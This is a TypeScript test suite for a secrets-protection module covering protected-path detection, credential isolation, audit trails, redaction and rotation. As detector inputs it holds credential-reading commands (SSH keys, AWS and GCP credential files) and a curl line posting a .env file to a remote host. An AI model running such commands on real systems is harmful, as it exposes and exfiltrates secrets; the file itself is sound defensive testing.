/**
 * Integration Tests for WP03 (T015)
 *
 * End-to-end security workflow tests covering all success criteria:
 *   SC-028-001: Audit export contains zero unredacted secrets
 *   SC-028-002: Old credential value not recoverable after rotation
 *   SC-028-003: Redaction latency p95 < 5ms
 *   SC-028-004: Cross-provider credential access denied in 100% of tests
 *   SC-028-005: Redaction audit trail present for every persisted artifact
 */

import { afterEach, beforeEach, describe, expect, it } from "bun:test";
import { mkdtempSync, rmSync, readFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { randomBytes } from "node:crypto";
import { CredentialStore, CredentialAccessDeniedError } from "../credential-store.js";
import { EncryptionService } from "../encryption.js";
import { RedactionEngine } from "../redaction-engine.js";
import { getDefaultRules } from "../redaction-rules.js";
import { RedactionAuditTrail } from "../audit-trail.js";
import { ProtectedPathDetector, ProtectedPathConfig } from "../protected-paths.js";
import { AuditSink } from "../../audit/audit-sink.js";
import { InMemoryLocalBus, type LocalBus } from "../../protocol/bus.js";

// ---------------------------------------------------------------------------
// Test helpers
// ---------------------------------------------------------------------------

function makeFixedEncryption(): EncryptionService {
  const fixedKey = randomBytes(32);
  return new EncryptionService({ masterKeyOverride: async () => fixedKey });
}

function makeStore(dataDir: string, bus: LocalBus): CredentialStore {
  return new CredentialStore({
    dataDir,
    bus,
    encryption: makeFixedEncryption(),
  });
}

function makeEngine(): RedactionEngine {
  const engine = new RedactionEngine();
  engine.loadRules(getDefaultRules());
  return engine;
}

function makeRedactFn(engine: RedactionEngine): (text: string) => string {
  return (text: string) =>
    engine.redact(text, {
      artifactId: `redact:${Date.now()}`,
      artifactType: "audit_payload",
      correlationId: "integration-test",
    }).redacted;
}

// ---------------------------------------------------------------------------
// Test suite
// ---------------------------------------------------------------------------

describe("Integration Tests (T015)", () => {
  let tmpDir: string;

  beforeEach(() => {
    tmpDir = mkdtempSync(join(tmpdir(), "helios-integration-test-"));
  });

  afterEach(() => {
    rmSync(tmpDir, { recursive: true, force: true });
  });

  // -------------------------------------------------------------------------
  // Protected path tests (FR-028-007, FR-028-008)
  // -------------------------------------------------------------------------

  describe("Protected path detection [FR-028-007]", () => {
    it("cat .env triggers warning", async () => {
      const detector = new ProtectedPathDetector();
      const warnings: string[] = [];
      detector.onWarning(m => warnings.push(m.matchedPath));

      const matches = await detector.check("cat .env");
      expect(matches.length).toBeGreaterThan(0);
      expect(matches[0].matchedPath).toBe(".env");
      expect(warnings).toContain(".env");
    });

    it("cat .env.local triggers warning", async () => {
      const detector = new ProtectedPathDetector();
      const matches = await detector.check("cat .env.local");
      expect(matches.length).toBeGreaterThan(0);
    });

    it("Windows .env path triggers warning", async () => {
      const detector = new ProtectedPathDetector();
      const matches = await detector.check("type C:\\repo\\.env");
      expect(matches.length).toBeGreaterThan(0);
      expect(matches[0].matchedPath).toBe("C:\\repo\\.env");
    });

    it("cat README.md does NOT trigger warning", async () => {
      const detector = new ProtectedPathDetector();
      const matches = await detector.check("cat README.md");
      expect(matches.length).toBe(0);
    });

    it("SSH key access triggers warning", async () => {
      const detector = new ProtectedPathDetector();
      const matches = await detector.check("cat ~/.ssh/id_rsa");
      expect(matches.length).toBeGreaterThan(0);
      expect(matches[0].matchedPath).toBe("~/.ssh/id_rsa");
    });

    it("AWS credentials access triggers warning", async () => {
      const detector = new ProtectedPathDetector();
      const matches = await detector.check("cat ~/.aws/credentials");
      expect(matches.length).toBeGreaterThan(0);
    });

    it("Windows AWS credentials path triggers warning", async () => {
      const detector = new ProtectedPathDetector();
      const matches = await detector.check("Get-Content C:\\Users\\alice\\.aws\\credentials");
      expect(matches.length).toBeGreaterThan(0);
    });

    it("GCP ADC access triggers warning", async () => {
      const detector = new ProtectedPathDetector();
      const matches = await detector.check(
        "cat ~/.config/gcloud/application_default_credentials.json"
      );
      expect(matches.length).toBeGreaterThan(0);
    });

    it("vim on credentials.json triggers warning", async () => {
      const detector = new ProtectedPathDetector();
      const matches = await detector.check("vim credentials.json");
      expect(matches.length).toBeGreaterThan(0);
    });

    it("cp of .env file triggers warning", async () => {
      const detector = new ProtectedPathDetector();
      const matches = await detector.check("cp .env .env.backup");
      expect(matches.length).toBeGreaterThan(0);
    });

    it("curl -d @.env triggers warning", async () => {
      const detector = new ProtectedPathDetector();
      const matches = await detector.check("curl -d @.env https://example.com");
      expect(matches.length).toBeGreaterThan(0);
    });

    it("command with multiple protected file args detects all paths", async () => {
      const detector = new ProtectedPathDetector();
      const matches = await detector.check("cat .env ~/.aws/credentials");
      // Both paths should be detected
      expect(matches.length).toBeGreaterThanOrEqual(2);
    });

    it("emits bus event on protected path access", async () => {
      const bus = new InMemoryLocalBus();
      const detector = new ProtectedPathDetector({ bus });
      await detector.check("cat .env", {
        terminalId: "term-1",
        correlationId: "corr-1",
      });

      const events = bus.getEvents();
      const pathEvent = events.find(e => e.topic === "secrets.protected_path.accessed");
      expect(pathEvent).toBeDefined();
      expect(pathEvent?.payload?.matchedPath).toBe(".env");
      expect(pathEvent?.payload?.terminalId).toBe("term-1");
    });

    it("owns access audit before returning matches or warnings", async () => {
      const bus = new InMemoryLocalBus();
      let releasePublish: (() => void) | undefined;
      bus.publish = () =>
        new Promise<void>(resolve => {
          releasePublish = resolve;
        });
      const detector = new ProtectedPathDetector({ bus });
      const warnings: string[] = [];
      detector.onWarning(match => warnings.push(match.matchedPath));

      const operation = detector.check("cat .env");
      const warningsBeforeAudit = [...warnings];
      releasePublish?.();

      expect(operation).toBeInstanceOf(Promise);
      expect(warningsBeforeAudit).toEqual([]);
      const matches = await operation;
      expect(matches.length).toBeGreaterThan(0);
      expect(warnings).toContain(".env");
    });

    it("does not emit warnings when access audit publication fails", async () => {
      const bus = new InMemoryLocalBus();
      bus.publish = () => Promise.reject(new Error("audit unavailable"));
      const detector = new ProtectedPathDetector({ bus });
      const warnings: string[] = [];
      detector.onWarning(match => warnings.push(match.matchedPath));

      await expect(detector.check("cat .env")).rejects.toThrow("audit unavailable");
      expect(warnings).toEqual([]);
    });

    it("redacts database credentials from direct access audit events", async () => {
      const bus = new InMemoryLocalBus();
      const detector = new ProtectedPathDetector({ bus });
      const connectionString = "postgres://alice:supersecret@db.internal/prod";

      await detector.check(`cat .env ${connectionString}`, {
        correlationId: "corr-database-secret",
      });

      const events = JSON.stringify(bus.getEvents());
      expect(events).not.toContain(connectionString);
      expect(events).not.toContain("supersecret");
    });

    it("redacts MongoDB SRV credentials from direct access audit events", async () => {
      const bus = new InMemoryLocalBus();
      const detector = new ProtectedPathDetector({ bus });
      const password = "cluster-password-value-123456";
      const connectionString = `mongodb+srv://alice:${password}@cluster.internal/prod`;

      await detector.check(`cat .env ${connectionString}`, {
        correlationId: "corr-mongodb-srv-secret",
      });

      const events = JSON.stringify(bus.getEvents());
      expect(events).not.toContain(connectionString);
      expect(events).not.toContain(password);
    });

    it("redacts Redis TLS credentials from direct access audit events", async () => {
      const bus = new InMemoryLocalBus();
      const detector = new ProtectedPathDetector({ bus });
      const password = "redis-password-value-123456";
      const connectionString = `rediss://cache:${password}@redis.internal/0`;

      await detector.check(`cat .env ${connectionString}`, {
        correlationId: "corr-rediss-secret",
      });

      const events = JSON.stringify(bus.getEvents());
      expect(events).not.toContain(connectionString);
      expect(events).not.toContain(password);
    });

    it("redacts AMQPS credentials from direct access audit events", async () => {
      const bus = new InMemoryLocalBus();
      const detector = new ProtectedPathDetector({ bus });
      const password = "broker-password-value-123456";
      const connectionString = `amqps://worker:${password}@broker.internal/prod`;

      await detector.check(`cat .env ${connectionString}`, {
        correlationId: "corr-amqps-secret",
      });

      const events = JSON.stringify(bus.getEvents());
      expect(events).not.toContain(connectionString);
      expect(events).not.toContain(password);
    });

    it("redacts SQL Server credentials from direct access audit events", async () => {
      const bus = new InMemoryLocalBus();
      const detector = new ProtectedPathDetector({ bus });
      const password = "sqlserver-password-value-123456";
      const connectionString = `mssql://admin:${password}@sql.internal/prod`;

      await detector.check(`cat .env ${connectionString}`, {
        correlationId: "corr-mssql-secret",
      });

      const events = JSON.stringify(bus.getEvents());
      expect(events).not.toContain(connectionString);
      expect(events).not.toContain(password);
    });

    it("redacts fine-grained GitHub tokens from direct access audit events", async () => {
      const bus = new InMemoryLocalBus();
      const detector = new ProtectedPathDetector({ bus });
      const token = `github_pat_${"A".repeat(82)}`;

      await detector.check(`cat .env ${token}`, {
        correlationId: "corr-github-token",
      });

      expect(JSON.stringify(bus.getEvents())).not.toContain(token);
    });

    it("redacts AWS secret keys from direct access audit events", async () => {
      const bus = new InMemoryLocalBus();
      const detector = new ProtectedPathDetector({ bus });
      const secret = "a".repeat(40);

      await detector.check(`cat .env aws_secret_access_key=${secret}`, {
        correlationId: "corr-aws-secret",
      });

      expect(JSON.stringify(bus.getEvents())).not.toContain(secret);
    });

    it("redacts private key headers from direct access audit events", async () => {
      const bus = new InMemoryLocalBus();
      const detector = new ProtectedPathDetector({ bus });
      const privateKeyHeader = "-----BEGIN RSA PRIVATE KEY-----";

      await detector.check(`cat .env ${privateKeyHeader}`, {
        correlationId: "corr-private-key",
      });

      expect(JSON.stringify(bus.getEvents())).not.toContain(privateKeyHeader);
    });

    it("redacts complete private keys from direct access audit events", async () => {
      const bus = new InMemoryLocalBus();
      const detector = new ProtectedPathDetector({ bus });
      const privateKeyBody = "MIIEprivatekeymaterial1234567890";
      const privateKey = [
        "-----BEGIN PRIVATE KEY-----",
        privateKeyBody,
        "-----END PRIVATE KEY-----",
      ].join("\n");

      await detector.check(`cat .env PRIVATE_KEY="${privateKey}"`, {
        correlationId: "corr-complete-private-key",
      });

      const events = JSON.stringify(bus.getEvents());
      expect(events).not.toContain(privateKey);
      expect(events).not.toContain(privateKeyBody);
    });

    it("redacts generic API tokens from direct access audit events", async () => {
      const bus = new InMemoryLocalBus();
      const detector = new ProtectedPathDetector({ bus });
      const token = "generic-token-value-123456";

      await detector.check(`cat .env api_token=${token}`, {
        correlationId: "corr-generic-token",
      });

      expect(JSON.stringify(bus.getEvents())).not.toContain(token);
    });

    it("redacts OAuth client secrets from direct access audit events", async () => {
      const bus = new InMemoryLocalBus();
      const detector = new ProtectedPathDetector({ bus });
      const clientSecret = "oauth-client-secret-value-123456";

      await detector.check(`cat .env client_secret=${clientSecret}`, {
        correlationId: "corr-client-secret",
      });

      expect(JSON.stringify(bus.getEvents())).not.toContain(clientSecret);
    });

    it("redacts password assignments from direct access audit events", async () => {
      const bus = new InMemoryLocalBus();
      const detector = new ProtectedPathDetector({ bus });
      const password = "database-password-value-123456";

      await detector.check(`cat .env password=${password}`, {
        correlationId: "corr-password",
      });

      expect(JSON.stringify(bus.getEvents())).not.toContain(password);
    });

    it("redacts namespaced password assignments from direct access audit events", async () => {
      const bus = new InMemoryLocalBus();
      const detector = new ProtectedPathDetector({ bus });
      const password = "namespaced-password-value-123456";

      await detector.check(`cat .env DATABASE_PASSWORD=${password}`, {
        correlationId: "corr-namespaced-password",
      });

      expect(JSON.stringify(bus.getEvents())).not.toContain(password);
    });

    it("redacts namespaced passwd assignments from direct access audit events", async () => {
      const bus = new InMemoryLocalBus();
      const detector = new ProtectedPathDetector({ bus });
      const password = "passwd-alias-value-123456";

      await detector.check(`cat .env DATABASE_PASSWD=${password}`, {
        correlationId: "corr-namespaced-passwd",
      });

      expect(JSON.stringify(bus.getEvents())).not.toContain(password);
    });

    it("redacts generic token assignments from direct access audit events", async () => {
      const bus = new InMemoryLocalBus();
      const detector = new ProtectedPathDetector({ bus });
      const token = "deployment-token-value-123456";

      await detector.check(`cat .env token=${token}`, {
        correlationId: "corr-token-assignment",
      });

      expect(JSON.stringify(bus.getEvents())).not.toContain(token);
    });

    it("redacts namespaced token assignments from direct access audit events", async () => {
      const bus = new InMemoryLocalBus();
      const detector = new ProtectedPathDetector({ bus });
      const token = "namespaced-token-value-123456";

      await detector.check(`cat .env DEPLOY_ACCESS_TOKEN=${token}`, {
        correlationId: "corr-namespaced-token",
      });

      expect(JSON.stringify(bus.getEvents())).not.toContain(token);
    });

    it("redacts generic secret assignments from direct access audit events", async () => {
      const bus = new InMemoryLocalBus();
      const detector = new ProtectedPathDetector({ bus });
      const secret = "service-secret-value-123456";

      await detector.check(`cat .env secret=${secret}`, {
        correlationId: "corr-secret-assignment",
      });

      expect(JSON.stringify(bus.getEvents())).not.toContain(secret);
    });

    it("redacts namespaced secret assignments from direct access audit events", async () => {
      const bus = new InMemoryLocalBus();
      const detector = new ProtectedPathDetector({ bus });
      const secret = "deployment-secret-value-123456";

      await detector.check(`cat .env DEPLOY_SECRET=${secret}`, {
        correlationId: "corr-namespaced-secret",
      });

      expect(JSON.stringify(bus.getEvents())).not.toContain(secret);
    });

    it("redacts namespaced signing keys from direct access audit events", async () => {
      const bus = new InMemoryLocalBus();
      const detector = new ProtectedPathDetector({ bus });
      const signingKey = "opaque-signing-key-material-123456";

      await detector.check(`cat .env SERVICE_SIGNING_KEY=${signingKey}`, {
        correlationId: "corr-namespaced-signing-key",
      });

      expect(JSON.stringify(bus.getEvents())).not.toContain(signingKey);
    });
  });

  describe("Configurable protected paths [FR-028-008]", () => {
    it("custom pattern addition triggers on matching commands", async () => {
      const config = new ProtectedPathConfig();
      const pattern = await config.addPattern("*.pem", "PEM certificate files");
      const detector = new ProtectedPathDetector({ config });

      const matches = await detector.check("cat server.pem");
      expect(matches.length).toBeGreaterThan(0);
      expect(matches[0].patternId).toBe(pattern.id);
    });

    it("disabled default pattern does not trigger", async () => {
      const config = new ProtectedPathConfig();
      await config.disablePattern("dotenv");
      const detector = new ProtectedPathDetector({ config });

      const matches = await detector.check("cat .env");
      expect(matches.length).toBe(0);
    });

    it("patterns persist to disk and reload", async () => {
      const configPath = join(tmpDir, "config", "protected-paths.json");
      const config = new ProtectedPathConfig({ configPath });
      await config.addPattern("*.secret", "Secret files");
      await config.saveToDisk();

      const config2 = new ProtectedPathConfig({ configPath });
      await config2.loadFromDisk();
      const patterns = config2.listPatterns();
      const customPattern = patterns.find(p => p.pattern === "*.secret");
      expect(customPattern).toBeDefined();
    });

    it("rejects empty pattern", async () => {
      const config = new ProtectedPathConfig();
      await expect(config.addPattern("", "empty")).rejects.toThrow();
    });

    it("rejects overly broad pattern **/*", async () => {
      const config = new ProtectedPathConfig();
      await expect(config.addPattern("**/*", "all files")).rejects.toThrow();
    });

    it("rejects overly broad pattern *", async () => {
      const config = new ProtectedPathConfig();
      await expect(config.addPattern("*", "all")).rejects.toThrow();
    });
  });

  describe("Acknowledgment debounce [FR-028-007]", () => {
    it("owns acknowledgment audit before enabling debounce", async () => {
      const bus = new InMemoryLocalBus();
      let releasePublish: (() => void) | undefined;
      bus.publish = envelope => {
        if (envelope.topic !== "secrets.protected_path.acknowledged") {
          return Promise.resolve();
        }
        return new Promise<void>(resolve => {
          releasePublish = resolve;
        });
      };
      const detector = new ProtectedPathDetector({ bus });

      const operation = detector.acknowledge("dotenv", ".env", "corr-owned-ack");
      const matchesBeforeAudit = await detector.check("cat .env");
      releasePublish?.();

      expect(operation).toBeInstanceOf(Promise);
      expect(matchesBeforeAudit.length).toBeGreaterThan(0);
      await operation;
      expect(await detector.check("cat .env")).toEqual([]);
    });

    it("acknowledgment prevents re-trigger within debounce window", async () => {
      const detector = new ProtectedPathDetector();
      const matches1 = await detector.check("cat .env");
      expect(matches1.length).toBeGreaterThan(0);

      // Acknowledge
      await detector.acknowledge(matches1[0].patternId, ".env", "corr-1");

      // Second check should be debounced
      const matches2 = await detector.check("cat .env");
      expect(matches2.length).toBe(0);
    });

    it("acknowledgment emits audit event", async () => {
      const bus = new InMemoryLocalBus();
      const detector = new ProtectedPathDetector({ bus });
      await detector.check("cat .env");
      await detector.acknowledge("dotenv", ".env", "corr-ack");

      const events = bus.getEvents();
      const ackEvent = events.find(e => e.topic === "secrets.protected_path.acknowledged");
      expect(ackEvent).toBeDefined();
      expect(ackEvent?.payload?.matchedPath).toBe(".env");
    });

    it("does not debounce when acknowledgment audit fails", async () => {
      const bus = new InMemoryLocalBus();
      bus.publish = envelope => {
        if (envelope.topic === "secrets.protected_path.acknowledged") {
          return Promise.reject(new Error("audit unavailable"));
        }
        return Promise.resolve();
      };
      const detector = new ProtectedPathDetector({ bus });

      await expect(detector.acknowledge("dotenv", ".env", "corr-failed-ack")).rejects.toThrow(
        "audit unavailable"
      );
      expect((await detector.check("cat .env")).length).toBeGreaterThan(0);
    });
  });

  // -------------------------------------------------------------------------
  // Cross-provider isolation tests (SC-028-004)
  // -------------------------------------------------------------------------

  describe("Cross-provider credential isolation [SC-028-004]", () => {
    it("provider A cannot access provider B credentials - 100% denial rate", async () => {
      const bus = new InMemoryLocalBus();
      const store = makeStore(tmpDir, bus);

      // Store credential for provider A
      await store.create("providerA", "ws1", "apiKey", "secret-a-value", "corr-001");

      let denialCount = 0;
      const attempts = 10;

      for (let i = 0; i < attempts; i++) {
        try {
          await store.retrieveWithContext(
            {
              requestingProviderId: "providerB",
              requestingWorkspaceId: "ws1",
              correlationId: `corr-${i}`,
            },
            "providerA",
            "ws1",
            "apiKey"
          );
          // Should never reach here
        } catch (err) {
          if (err instanceof CredentialAccessDeniedError) {
            denialCount++;
          }
        }
      }

      const denialRate = denialCount / attempts;
      expect(denialRate).toBe(1.0); // 100% denial
    });

    it("cross-provider denial emits audit event", async () => {
      const bus = new InMemoryLocalBus();
      const store = makeStore(tmpDir, bus);
      await store.create("providerA", "ws1", "key", "val", "corr-1");

      try {
        await store.retrieveWithContext(
          {
            requestingProviderId: "providerB",
            requestingWorkspaceId: "ws1",
            correlationId: "corr-deny",
          },
          "providerA",
          "ws1",
          "key"
        );
        // eslint-disable-next-line no-unused-vars
      } catch (_) {
        /* expected */
      }

      await new Promise(r => setTimeout(r, 10));

      const events = bus.getEvents();
      const deniedEvent = events.find(e => e.topic === "secrets.credential.access.denied");
      expect(deniedEvent).toBeDefined();
      expect(deniedEvent?.payload?.requestingProviderId).toBe("providerB");
      expect(deniedEvent?.payload?.targetProviderId).toBe("providerA");
    });

    it("correct provider CAN access its own credentials", async () => {
      const bus = new InMemoryLocalBus();
      const store = makeStore(tmpDir, bus);
      await store.create("providerA", "ws1", "key", "secret-value", "corr-1");

      const value = await store.retrieveWithContext(
        {
          requestingProviderId: "providerA",
          requestingWorkspaceId: "ws1",
          correlationId: "corr-ok",
        },
        "providerA",
        "ws1",
        "key"
      );
      expect(value).toBe("secret-value");
    });
  });

  // -------------------------------------------------------------------------
  // Audit completeness tests (SC-028-005)
  // -------------------------------------------------------------------------

  describe("Audit completeness [SC-028-005]", () => {
    it("does not expose mutable references to persisted audit records", async () => {
      const sink = new AuditSink();
      const ingested = await sink.ingest({
        id: "credential-created",
        type: "event",
        ts: new Date().toISOString(),
        topic: "secrets.credential.created",
        payload: {
          correlationId: "corr-audit-ownership",
          name: "original",
        },
      });
      if (!ingested) throw new Error("Expected an audit record");

      ingested.payload.name = "mutated-ingest-result";
      const queried = sink.query({ topic: "secrets.credential.created" });
      expect(queried[0]?.payload.name).toBe("original");

      if (!queried[0]) throw new Error("Expected a queried audit record");
      queried[0].payload.name = "mutated-query-result";
      expect(sink.query({ topic: "secrets.credential.created" })[0]?.payload.name).toBe("original");
    });

    it("full lifecycle: create/access/rotate/revoke all have audit records", async () => {
      const bus = new InMemoryLocalBus();
      const engine = makeEngine();
      const sink = new AuditSink({ redactFn: makeRedactFn(engine) });
      const wrappedBus = sink.wrapBus(bus);
      const storeWithAudit = makeStore(tmpDir, wrappedBus);

      await storeWithAudit.create("prov", "ws", "key", "val", "corr-create");
      await storeWithAudit.retrieveWithContext(
        {
          requestingProviderId: "prov",
          requestingWorkspaceId: "ws",
          correlationId: "corr-access",
        },
        "prov",
        "ws",
        "key"
      );
      await storeWithAudit.rotate("prov", "ws", "key", "newval", "corr-rotate");
      await storeWithAudit.revoke("prov", "ws", "key", "corr-revoke");

      const created = sink.query({ topic: "secrets.credential.created" });
      const accessed = sink.query({ topic: "secrets.credential.accessed" });
      const rotated = sink.query({ topic: "secrets.credential.rotated" });
      const revoked = sink.query({ topic: "secrets.credential.revoked" });

      expect(created.length).toBeGreaterThan(0);
      expect(accessed.length).toBeGreaterThan(0);
      expect(rotated.length).toBeGreaterThan(0);
      expect(revoked.length).toBeGreaterThan(0);
    });

    it("redaction audit trail present for every persisted artifact", async () => {
      const bus = new InMemoryLocalBus();
      const engine = makeEngine();
      const sink = new AuditSink({ redactFn: makeRedactFn(engine) });
      const wrappedBus = sink.wrapBus(bus);
      const trail = new RedactionAuditTrail({ bus: wrappedBus });

      const artifactIds = ["artifact-1", "artifact-2", "artifact-3"];
      for (const id of artifactIds) {
        const result = engine.redact(`output for ${id}`, {
          artifactId: id,
          artifactType: "terminal_output",
          correlationId: "corr-completeness",
        });
        await trail.record(id, result, {
          artifactId: id,
          artifactType: "terminal_output",
          correlationId: "corr-completeness",
        });
      }

      for (const id of artifactIds) {
        const hasRecord = trail.verify(id);
        expect(hasRecord).toBe(true);
      }

      const auditRecords = sink.query({ topic: "secrets.redaction.applied" });
      expect(auditRecords.length).toBe(artifactIds.length);
    });
  });

  // -------------------------------------------------------------------------
  // End-to-end redaction test (SC-028-001)
  // -------------------------------------------------------------------------

  describe("End-to-end redaction [SC-028-001]", () => {
    it("terminal output with injected secrets is fully redacted in export", async () => {
      const bus = new InMemoryLocalBus();
      const engine = makeEngine();
      const sink = new AuditSink({ redactFn: makeRedactFn(engine) });
      const wrappedBus = sink.wrapBus(bus);
      const trail = new RedactionAuditTrail({ bus: wrappedBus });

      const secretKey = "AKIAIOSFODNN7EXAMPLE";
      const terminalOutput = `Starting deployment...\nUsing key: ${secretKey}\nDeployment complete`;

      // Redact the terminal output before persisting
      const redactResult = engine.redact(terminalOutput, {
        artifactId: "terminal:session-1",
        artifactType: "terminal_output",
        correlationId: "e2e-test",
      });

      await trail.record("terminal:session-1", redactResult, {
        artifactId: "terminal:session-1",
        artifactType: "terminal_output",
        correlationId: "e2e-test",
      });

      const bundle = sink.export();
      const bundleStr = JSON.stringify(bundle);

      // The raw secret must not appear anywhere in the export
      expect(bundleStr).not.toContain(secretKey);
      expect(bundle.redacted).toBe(true);
      expect(bundle.records.length).toBeGreaterThan(0);
    });

    it("export bundle does not corrupt non-secret content", async () => {
      const bus = new InMemoryLocalBus();
      const engine = makeEngine();
      const sink = new AuditSink({ redactFn: makeRedactFn(engine) });
      const wrappedBus = sink.wrapBus(bus);
      const trail = new RedactionAuditTrail({ bus: wrappedBus });

      const safeOutput = "Build completed in 1.42s. 3 warnings, 0 errors.";
      const result = engine.redact(safeOutput, {
        artifactId: "terminal:safe-1",
        artifactType: "terminal_output",
        correlationId: "e2e-safe",
      });
      await trail.record("terminal:safe-1", result, {
        artifactId: "terminal:safe-1",
        artifactType: "terminal_output",
        correlationId: "e2e-safe",
      });

      // Safe output should be unchanged
      expect(result.redacted).toBe(safeOutput);
    });
  });

  // -------------------------------------------------------------------------
  // Credential rotation test (SC-028-002)
  // -------------------------------------------------------------------------

  describe("Credential rotation [SC-028-002]", () => {
    it("old credential value is not recoverable from encrypted file after rotation", async () => {
      const bus = new InMemoryLocalBus();
      const store = makeStore(tmpDir, bus);

      const oldValue = "old-secret-" + randomBytes(8).toString("hex");
      const newValue = "new-secret-" + randomBytes(8).toString("hex");

      await store.create("prov", "ws", "apiKey", oldValue, "corr-create");

      // Read the raw encrypted file before rotation
      const credPath = join(tmpDir, "secrets", "prov", "ws", "apiKey.enc");
      const beforeRotation = readFileSync(credPath, "utf8");

      await store.rotate("prov", "ws", "apiKey", newValue, "corr-rotate");

      // Read the raw encrypted file after rotation
      const afterRotation = readFileSync(credPath, "utf8");

      // The raw file content should have changed
      expect(afterRotation).not.toBe(beforeRotation);

      // Old plaintext value must not appear in new file
      expect(afterRotation).not.toContain(oldValue);

      // New value should be retrievable
      const retrieved = await store.retrieve("prov", "ws", "apiKey");
      expect(retrieved).toBe(newValue);
    });

    it("rotation emits audit event", async () => {
      const bus = new InMemoryLocalBus();
      const store = makeStore(tmpDir, bus);

      await store.create("prov", "ws", "key", "old", "corr-1");
      await store.rotate("prov", "ws", "key", "new", "corr-2");

      const events = bus.getEvents();
      const rotatedEvent = events.find(e => e.topic === "secrets.credential.rotated");
      expect(rotatedEvent).toBeDefined();
      expect(rotatedEvent?.payload?.name).toBe("key");
      // Audit event must not contain old or new values
      const raw = JSON.stringify(rotatedEvent);
      expect(raw).not.toContain("old");
      expect(raw).not.toContain("new");
    });
  });

  // -------------------------------------------------------------------------
  // Redaction latency test (SC-028-003)
  // -------------------------------------------------------------------------

  describe("Redaction latency [SC-028-003]", () => {
    it("p95 redaction latency < 5ms over 100 audit events", () => {
      const engine = makeEngine();
      const latencies: number[] = [];

      // Use typical terminal output (~200 chars each)
      const sampleOutputs = [
        "Compiling TypeScript files... Done in 1.42s with 0 errors.",
        "Running test suite: 45 tests passed, 0 failed, 2 skipped.",
        "Deploying to staging environment... Build ID: abc123def456",
        "Fetching dependencies from npm registry...",
        "Starting HTTP server on port 3000",
        "Connected to PostgreSQL database at localhost:5432/mydb",
        "WebSocket connection established from 127.0.0.1:52341",
        "Cache hit rate: 94.2% (hit: 1204, miss: 72)",
      ];

      for (let i = 0; i < 100; i++) {
        const text = sampleOutputs[i % sampleOutputs.length];
        const result = engine.redact(text, {
          artifactId: `latency-test:${i}`,
          artifactType: "terminal_output",
          correlationId: `corr-${i}`,
        });
        latencies.push(result.latencyMs);
      }

      latencies.sort((a, b) => a - b);
      const p95 = latencies[Math.floor(latencies.length * 0.95)];

      // p95 < 5ms requirement
      expect(p95).toBeLessThan(5);
    });
  });

  // -------------------------------------------------------------------------
  // Audit integration with protected paths (SC-028-005)
  // -------------------------------------------------------------------------

  describe("Protected path audit integration [SC-028-005]", () => {
    it("protected path access events are persisted in audit sink", async () => {
      const bus = new InMemoryLocalBus();
      const engine = makeEngine();
      const sink = new AuditSink({ redactFn: makeRedactFn(engine) });
      const wrappedBus = sink.wrapBus(bus);

      const detector = new ProtectedPathDetector({ bus: wrappedBus });
      await detector.check("cat .env", {
        terminalId: "term-1",
        correlationId: "corr-path",
      });

      // Allow event processing
      await new Promise(r => setTimeout(r, 5));

      const records = sink.query({ topic: "secrets.protected_path.accessed" });
      expect(records.length).toBeGreaterThan(0);
      expect(records[0].payload?.matchedPath).toBe(".env");
    });

    it("protected path event in audit sink does not contain raw command secrets", async () => {
      const bus = new InMemoryLocalBus();
      const engine = makeEngine();
      const sink = new AuditSink({ redactFn: makeRedactFn(engine) });
      const wrappedBus = sink.wrapBus(bus);

      const detector = new ProtectedPathDetector({ bus: wrappedBus });
      // Command that includes an AWS key inline (should be stripped in redactedCommand)
      await detector.check("cat .env AKIAIOSFODNN7EXAMPLE", {
        terminalId: "term-1",
        correlationId: "corr-sensitive",
      });

      await new Promise(r => setTimeout(r, 5));

      const bundle = sink.export();
      const bundleStr = JSON.stringify(bundle);
      expect(bundleStr).not.toContain("AKIAIOSFODNN7EXAMPLE");
    });
  });
});
